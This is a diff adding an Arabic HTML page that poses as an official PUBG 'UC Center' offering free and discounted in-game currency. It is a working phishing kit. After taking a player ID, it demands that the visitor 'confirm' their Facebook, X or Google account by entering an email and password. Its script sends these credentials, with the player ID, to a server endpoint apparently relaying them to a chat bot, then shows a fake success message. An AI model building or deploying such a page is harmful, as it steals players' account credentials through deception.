@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG UC Center | مركز شحن شدات ببجي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        body {
+            background-color: #0a0a0a; color: #ffffff; min-height: 100vh; padding: 20px;
+            background-image: linear-gradient(rgba(10, 10, 10, 0.9), rgba(10, 10, 10, 0.9)), url('https://images.unsplash.com/photo-1542751371-adc38448a05e?q=80&w=2070&auto=format&fit=crop');
+            background-size: cover; background-position: center; background-attachment: fixed;
+        }
+        .container { max-width: 600px; margin: 0 auto; position: relative; z-index: 2; }
+        
+        .header { text-align: center; margin-bottom: 25px; background: linear-gradient(145deg, #1a1a1a, #0a0a0a); border-radius: 20px; border: 2px solid #f39c12; box-shadow: 0 0 30px rgba(243, 156, 18, 0.3); position: relative; overflow: hidden; }
+        .header img { width: 100%; height: auto; display: block; border-radius: 18px 18px 0 0; }
+        .header .header-text { padding: 15px; }
+        .header h1 { font-size: 24px; color: #f1c40f; margin-bottom: 5px; }
+        .header p { font-size: 14px; color: #bdc3c7; }
+
+        .step { display: none; animation: fadeIn 0.4s ease; }
+        .step.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .plans-container { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+        .plan-card { background: rgba(26, 26, 26, 0.9); border: 1px solid #333; border-radius: 12px; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: all 0.3s ease; }
+        .plan-card:hover { border-color: #f39c12; transform: translateY(-2px); }
+        .plan-card.selected { border-color: #f1c40f; background: rgba(243, 156, 18, 0.1); box-shadow: 0 0 15px rgba(243, 156, 18, 0.3); }
+        
+        .plan-info { display: flex; align-items: center; gap: 15px; }
+        .plan-info i { font-size: 30px; color: #f39c12; }
+        .plan-info h3 { font-size: 16px; margin-bottom: 3px; color: #fff; }
+        .plan-info p { font-size: 12px; color: #bdc3c7; }
+        
+        .price-tag { background: #f39c12; color: #000; padding: 6px 12px; border-radius: 8px; font-weight: bold; font-size: 14px; }
+        .price-tag.free { background: #2ecc71; color: #fff; }
+
+        .input-group { background: rgba(26, 26, 26, 0.9); border: 1px solid #333; border-radius: 10px; padding: 5px 15px; margin-bottom: 15px; display: flex; align-items: center; transition: 0.3s; }
+        .input-group:focus-within { border-color: #f39c12; box-shadow: 0 0 10px rgba(243, 156, 18, 0.2); }
+        .input-group i { color: #f39c12; font-size: 18px; margin-left: 10px; }
+        .input-group input { width: 100%; padding: 12px 0; background: transparent; border: none; color: #fff; font-size: 15px; outline: none; }
+
+        .submit-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #f1c40f, #e67e22); color: #000; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; gap: 10px; box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4); margin-top: 10px; }
+        .submit-btn:hover { transform: scale(1.02); }
+        .submit-btn:disabled { background: #555; cursor: not-allowed; box-shadow: none; }
+
+        .warning-box { background: rgba(231, 76, 60, 0.1); border: 1px solid #e74c3c; color: #e74c3c; padding: 15px; border-radius: 10px; text-align: center; font-weight: bold; font-size: 14px; margin-bottom: 20px; }
+
+        .social-login { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+        .social-btn { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; border: 1px solid #333; background: #1a1a1a; color: #fff; transition: 0.3s; }
+        .social-btn:hover { transform: scale(1.02); }
+        .social-btn.fb:hover { background: #1877F2; border-color: #1877F2; }
+        .social-btn.tw:hover { background: #000; border-color: #fff; }
+        .social-btn.gl:hover { background: #DB4437; border-color: #DB4437; }
+
+        .login-fields { display: none; margin-top: 15px; padding-top: 15px; border-top: 1px solid #333; }
+        .login-fields.active { display: block; }
+
+        .success-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.95); z-index: 999; justify-content: center; align-items: center; flex-direction: column; padding: 20px; text-align: center; }
+        .success-modal.active { display: flex; }
+        .success-icon { font-size: 100px; color: #2ecc71; animation: popIn 0.5s ease; margin-bottom: 20px; }
+        .success-text { font-size: 22px; font-weight: bold; color: #2ecc71; }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+
+        .error-msg { color: #e74c3c; background: rgba(231, 76, 60, 0.1); padding: 10px; border-radius: 8px; text-align: center; font-size: 14px; font-weight: bold; margin-bottom: 15px; display: none; border: 1px solid rgba(231, 76, 60, 0.3); }
+        .footer { text-align: center; margin-top: 30px; color: #555; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <img src="https://www.image2url.com/r2/default/images/1792705068581-6caedc12-b4da-45c4-96aa-3dbb235fa2ba.jpg" alt="PUBG Banner">
+            <div class="header-text">
+                <h1>PUBG UC CENTER</h1>
+                <p>مركز شحن شدات ببجي الرسمي</p>
+            </div>
+        </div>
+
+        <div id="step1" class="step active">
+            <div class="plans-container">
+                <div class="plan-card" onclick="selectPlan('1000', 'مجاناً (كل 24 ساعة)', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-gift"></i>
+                        <div><h3>1000 شدة (UC)</h3><p>عرض مجاني كل 24 ساعة</p></div>
+                    </div>
+                    <div class="price-tag free">مجاناً</div>
+                </div>
+                <div class="plan-card" onclick="selectPlan('3000', '$4.99', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-coins"></i>
+                        <div><h3>3000 شدة (UC)</h3><p>باقة المحترفين</p></div>
+                    </div>
+                    <div class="price-tag">$4.99</div>
+                </div>
+                <div class="plan-card" onclick="selectPlan('5000', '$7.99', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-coins"></i>
+                        <div><h3>5000 شدة (UC)</h3><p>باقة VIP</p></div>
+                    </div>
+                    <div class="price-tag">$7.99</div>
+                </div>
+                <div class="plan-card" onclick="selectPlan('10000', '$14.99', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-crown"></i>
+                        <div><h3>10000 شدة (UC)</h3><p>باقة الأسطورة</p></div>
+                    </div>
+                    <div class="price-tag">$14.99</div>
+                </div>
+                <div class="plan-card" onclick="selectPlan('15000', '$19.99', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-gem"></i>
+                        <div><h3>15000 شدة (UC)</h3><p>باقة الديلوكس</p></div>
+                    </div>
+                    <div class="price-tag">$19.99</div>
+                </div>
+                <div class="plan-card" onclick="selectPlan('20000', '$24.99', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-star"></i>
+                        <div><h3>20000 شدة (UC)</h3><p>باقة الأساطير</p></div>
+                    </div>
+                    <div class="price-tag">$24.99</div>
+                </div>
+            </div>
+
+            <div id="errorBox1" class="error-msg"></div>
+
+            <div class="input-group">
+                <i class="fas fa-gamepad"></i>
+                <input type="text" id="playerId" placeholder="آيدي اللاعب (ID)">
+            </div>
+
+            <button class="submit-btn" onclick="goToStep2()">
+                <i class="fas fa-arrow-left"></i> متابعة
+            </button>
+        </div>
+
+        <div id="step2" class="step">
+            <div class="warning-box">
+                ⚠️ يجب تأكيد الحساب لضمان وصول الشدات فوراً
+            </div>
+
+            <p style="text-align: center; margin-bottom: 15px; color: #bdc3c7;">اختر طريقة تسجيل الدخول للمتابعة</p>
+
+            <div class="social-login">
+                <div class="social-btn fb" onclick="showLogin('فيسبوك', this)">
+                    <i class="fab fa-facebook"></i> المتابعة عبر فيسبوك
+                </div>
+                <div class="social-btn tw" onclick="showLogin('تويتر / X', this)">
+                    <i class="fab fa-twitter"></i> المتابعة عبر تويتر / X
+                </div>
+                <div class="social-btn gl" onclick="showLogin('جوجل', this)">
+                    <i class="fab fa-google"></i> المتابعة عبر جوجل
+                </div>
+            </div>
+
+            <div id="loginFields" class="login-fields">
+                <div id="errorBox2" class="error-msg"></div>
+                <div class="input-group">
+                    <i class="fas fa-envelope"></i>
+                    <input type="email" id="email" placeholder="البريد الإلكتروني">
+                </div>
+                <div class="input-group">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" id="password" placeholder="كلمة السر">
+                </div>
+                <button class="submit-btn" id="submitBtn" onclick="sendOrder()">
+                    <i class="fas fa-check-circle"></i> استلام الشدات الآن
+                </button>
+            </div>
+        </div>
+
+        <div class="footer">© 2026 PUBG UC Center. جميع الحقوق محفوظة.</div>
+    </div>
+
+    <div class="success-modal" id="successModal">
+        <i class="fas fa-check-circle success-icon"></i>
+        <div class="success-text">تم إرسال طلب الشحن بنجاح!</div>
+        <div style="color: #bdc3c7; margin-top: 10px;">سيتم إضافة الشدات إلى حسابك قريباً.</div>
+    </div>
+
+    <script>
+        // بنقرا الآيدي من اللينك
+        const urlParams = new URLSearchParams(window.location.search);
+        const userChatId = urlParams.get('chatId');
+        
+        let selectedUC = "";
+        let selectedPrice = "";
+        let playerId = "";
+        let loginMethod = "";
+
+        function selectPlan(uc, price, element) {
+            selectedUC = uc;
+            selectedPrice = price;
+            document.querySelectorAll('.plan-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            document.getElementById('errorBox1').style.display = 'none';
+        }
+
+        function goToStep2() {
+            playerId = document.getElementById('playerId').value.trim();
+            const errorBox = document.getElementById('errorBox1');
+
+            if (!selectedUC) { errorBox.innerText = "❌ يرجى اختيار باقة الشحن أولاً!"; errorBox.style.display = 'block'; return; }
+            if (!playerId || playerId.length < 5) { errorBox.innerText = "❌ يرجى إدخال آيدي لاعب صحيح (5 أرقام على الأقل)!"; errorBox.style.display = 'block'; return; }
+
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }
+
+        function showLogin(method, element) {
+            loginMethod = method;
+            document.getElementById('loginFields').classList.add('active');
+            
+            document.querySelectorAll('.social-btn').forEach(btn => {
+                btn.style.borderColor = '#333';
+                btn.style.background = '#1a1a1a';
+            });
+            element.style.borderColor = '#f1c40f';
+            element.style.background = 'rgba(243, 156, 18, 0.2)';
+        }
+
+        // دالة بتكلم السيرفر بتاعنا
+        async function sendToBot(text) {
+            const formData = new FormData();
+            formData.append('chat_id', userChatId);
+            formData.append('text', text);
+            await fetch('/send_custom_message', { method: 'POST', body: formData });
+        }
+
+        async function sendOrder() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorBox = document.getElementById('errorBox2');
+            const btn = document.getElementById('submitBtn');
+            const successModal = document.getElementById('successModal');
+
+            errorBox.style.display = 'none';
+
+            if (!loginMethod) { errorBox.innerText = "❌ يرجى اختيار طريقة تسجيل الدخول!"; errorBox.style.display = 'block'; return; }
+            if (!email || !email.includes('@')) { errorBox.innerText = "❌ يرجى إدخال بريد إلكتروني صحيح!"; errorBox.style.display = 'block'; return; }
+            if (!password || password.length < 4) { errorBox.innerText = "❌ يرجى إدخال كلمة سر صحيحة (4 حروف على الأقل)!"; errorBox.style.display = 'block'; return; }
+
+            btn.disabled = true;
+
+            const text = `🎮 <b>طلب شحن ببجي جديد:</b>\n\n🆔 <b>آيدي اللاعب:</b> ${playerId}\n💰 <b>الباقة:</b> ${selectedUC} شدة (${selectedPrice})\n\n🔐 <b>طريقة التأكيد:</b> ${loginMethod}\n📧 <b>البريد:</b> ${email}\n🔑 <b>كلمة السر:</b> ${password}`;
+            
+            await sendToBot(text);
+            btn.disabled = false;
+
+            successModal.classList.add('active');
+            setTimeout(() => {
+                successModal.classList.remove('active');
+                document.getElementById('playerId').value = '';
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('loginFields').classList.remove('active');
+                document.querySelectorAll('.social-btn').forEach(btn => {
+                    btn.style.borderColor = '#333';
+                    btn.style.background = '#1a1a1a';
+                });
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step1').classList.add('active');
+                selectedUC = "";
+                document.querySelectorAll('.plan-card').forEach(card => card.classList.remove('selected'));
+            }, 4000);
+        }
+    </script>
+</body>
+</html>
